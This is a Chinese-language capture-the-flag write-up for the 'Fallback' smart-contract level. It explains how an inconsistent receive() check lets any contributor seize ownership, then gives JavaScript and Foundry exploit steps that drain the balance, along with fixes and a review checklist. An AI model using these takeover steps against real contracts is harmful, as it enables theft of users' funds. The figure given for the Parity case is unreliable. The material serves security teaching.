# 02 - Fallback

## 关卡信息
- **难度**: ⭐⭐ (简单)
- **合约**: Fallback.sol
- **Solidity版本**: ^0.8.0
- **目标**:
  1. 获得合约的所有权
  2. 将合约余额降为0

## 漏洞分析

### 核心漏洞: receive函数的权限控制缺陷

合约提供了两个获取ownership的路径，但其中一个存在严重的安全问题。

#### 漏洞代码
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;  // 只需要任意贡献即可成为owner!
}
```

### 两条路径对比

#### 路径1: contribute()函数（设计路径）
```solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}

constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);  // 1000 ETH!
}
```

**问题**：
- Owner初始贡献：1000 ETH
- 每次调用最多贡献：0.001 ETH
- 需要贡献超过1000 ETH才能成为owner
- 需要调用 > 1,000,000次
- **完全不现实**

#### 路径2: receive()函数（漏洞路径）
```solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
}
```

**漏洞**：
- 只需要 `contributions[msg.sender] > 0`（任意贡献）
- 然后发送任意数量ETH触发receive()
- **立即成为owner**
- 条件检查不一致导致权限绕过

### 关键问题

1. **不一致的权限检查**
   - `contribute()`: 需要 > 1000 ETH
   - `receive()`: 只需要 > 0 ETH

2. **receive函数设计缺陷**
   - 接收ETH的函数不应该改变关键状态
   - 特别是ownership这种敏感权限

3. **最小权限原则违反**
   - receive()应该只处理接收ETH
   - 不应该有复杂的业务逻辑

## 攻击步骤

### 完整攻击流程

**步骤1**: 建立最小贡献记录
```javascript
await contract.contribute({value: toWei("0.0001")});
```

**步骤2**: 验证贡献
```javascript
const contribution = await contract.getContribution();
console.log(contribution); // > 0
```

**步骤3**: 触发receive()函数
```javascript
await contract.sendTransaction({value: toWei("0.0001")});
```

**步骤4**: 验证ownership
```javascript
const owner = await contract.owner();
console.log(owner === attacker); // true
```

**步骤5**: 提取所有资金
```javascript
await contract.withdraw();
```

**步骤6**: 验证成功
```javascript
const balance = await getBalance(contract.address);
console.log(balance); // 0
```

### Foundry实现
```solidity
function testExploit() public {
    // 1. 最小贡献
    vm.prank(attacker);
    fallback.contribute{value: 0.0001 ether}();

    // 2. 触发receive()
    vm.prank(attacker);
    (bool success,) = address(fallback).call{value: 0.0001 ether}("");
    require(success);

    // 3. 提取资金
    vm.prank(attacker);
    fallback.withdraw();
}
```

## 最小攻击成本分析

```solidity
贡献: 1 wei
触发: 1 wei
总计: 2 wei

收益: 合约全部余额
成本: 2 wei
ROI: 无限
```

## 安全问题详解

### 问题1: receive函数职责过重
```solidity
// ❌ 错误：receive函数改变关键状态
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;  // 危险！
}
```

### 问题2: 条件检查不一致
```solidity
// Path 1: 需要超过1000 ETH
if (contributions[msg.sender] > contributions[owner]) {
    owner = msg.sender;
}

// Path 2: 只需要大于0
require(contributions[msg.sender] > 0);
owner = msg.sender;
```

### 问题3: 缺少事件日志
没有记录ownership变更，难以追踪异常行为。

## 防御建议

### 方案1: 移除receive中的ownership变更
```solidity
receive() external payable {
    // 只接收ETH，不改变状态
    contributions[msg.sender] += msg.value;
}
```

### 方案2: 使用一致的条件
```solidity
receive() external payable {
    require(msg.value > 0);
    contributions[msg.sender] += msg.value;
    // 使用与contribute相同的条件
    if (contributions[msg.sender] > contributions[owner]) {
        owner = msg.sender;
    }
}
```

### 方案3: 使用OpenZeppelin Ownable
```solidity
import "@openzeppelin/contracts/access/Ownable.sol";

contract FallbackFixed is Ownable {
    mapping(address => uint256) public contributions;

    constructor() Ownable(msg.sender) {
        contributions[msg.sender] = 1000 ether;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
    }

    receive() external payable {
        contributions[msg.sender] += msg.value;
    }

    function withdraw() public onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }
}
```

### 方案4: 添加事件日志
```solidity
event OwnershipChanged(address indexed previousOwner, address indexed newOwner);

function _transferOwnership(address newOwner) internal {
    address oldOwner = owner;
    owner = newOwner;
    emit OwnershipChanged(oldOwner, newOwner);
}
```

## 安全启示

### 1. receive/fallback函数原则
- ✅ 保持简单
- ✅ 避免复杂逻辑
- ✅ 不要改变关键状态
- ✅ 特别是权限相关的状态

### 2. 权限检查一致性
所有能够改变关键状态的路径必须使用相同的安全标准。

### 3. 最小权限原则
函数应该只做必要的事情，不要超出其职责范围。

### 4. 使用标准库
经过审计的标准实现（如OpenZeppelin）更安全。

## 相关真实案例

### Parity多签钱包 (2017)
- 虽然不是完全相同，但都涉及fallback函数安全
- 允许通过delegatecall改变关键状态
- 导致3000万美元被冻结

### 教训
1. 接收ETH的函数必须极其简单
2. 避免在receive/fallback中改变关键状态
3. 所有权限路径必须经过严格审查
4. 使用标准化的权限管理方案

## 代码审查清单

在审查类似代码时，检查：

- [ ] receive/fallback函数是否改变了关键状态？
- [ ] 不同路径的权限检查是否一致？
- [ ] 是否有事件日志记录状态变更？
- [ ] 是否使用了经过审计的标准库？
- [ ] 测试是否覆盖了所有权限变更路径？

## 相关资源

- [Solidity Receive Function](https://docs.soliditylang.org/en/latest/contracts.html#receive-ether-function)
- [OpenZeppelin Ownable](https://docs.openzeppelin.com/contracts/access-control)
- [SWC-132: Unexpected Ether balance](https://swcregistry.io/docs/SWC-132)
- [Consensys Best Practices](https://consensys.github.io/smart-contract-best-practices/)

## 运行POC

```bash
# 运行所有测试
forge test --match-contract FallbackTest -vvv

# 运行完整exploit测试
forge test --match-test testCompleteExploit -vvvv

# 查看gas消耗
forge test --match-test testMinimumExploitCost --gas-report
```
